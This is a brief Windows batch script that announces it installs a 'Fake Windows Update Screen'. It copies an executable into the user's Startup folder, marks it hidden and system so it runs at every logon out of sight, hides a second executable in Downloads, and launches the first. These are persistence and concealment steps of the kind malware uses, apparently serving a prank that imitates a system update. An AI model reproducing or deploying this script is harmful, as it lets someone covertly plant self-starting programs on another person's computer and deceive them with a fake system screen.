@echo off
echo Installing Fake Windows Update Screen
attrib -h -s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.exe"&del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.exe"
copy /y start.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.exe"
attrib +h +s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.exe"
attrib -h -s "%userprofile%\downloads\accessibility.exe"&del "%userprofile%\downloads\accessibility.exe"
copy /y accessibility.exe "%userprofile%\downloads\accessibility.exe"
attrib +h "%userprofile%\downloads\accessibility.exe"
start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.exe"
echo.
echo Finished Installation
timeout 2 >nul